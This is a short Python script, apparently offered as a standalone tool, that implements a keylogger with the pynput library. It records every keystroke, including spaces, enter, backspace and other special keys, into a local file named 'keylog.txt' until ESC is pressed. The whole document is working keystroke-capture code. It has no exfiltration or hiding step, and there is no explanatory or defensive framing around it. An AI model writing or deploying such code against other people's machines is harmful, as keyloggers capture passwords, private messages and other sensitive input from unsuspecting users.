from pynput.keyboard import Listener

log_file = "keylog.txt"

# Function to log the keys pressed
def log_keystrokes(key):
    try:
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        with open(log_file, "a") as file:
            if key == key.space:
                file.write(' ')  
            elif key == key.enter:
                file.write('\n')  
            elif key == key.backspace:
                file.write('[BACKSPACE]')  
            else:
                file.write(f'[{key}]')  

# Function to stop the keylogger (ESC key to stop)
def stop_logging(key):
    if key == key.esc:
        return False

# Start listening to the keyboard
with Listener(on_press=log_keystrokes, on_release=stop_logging) as listener:
    listener.join()

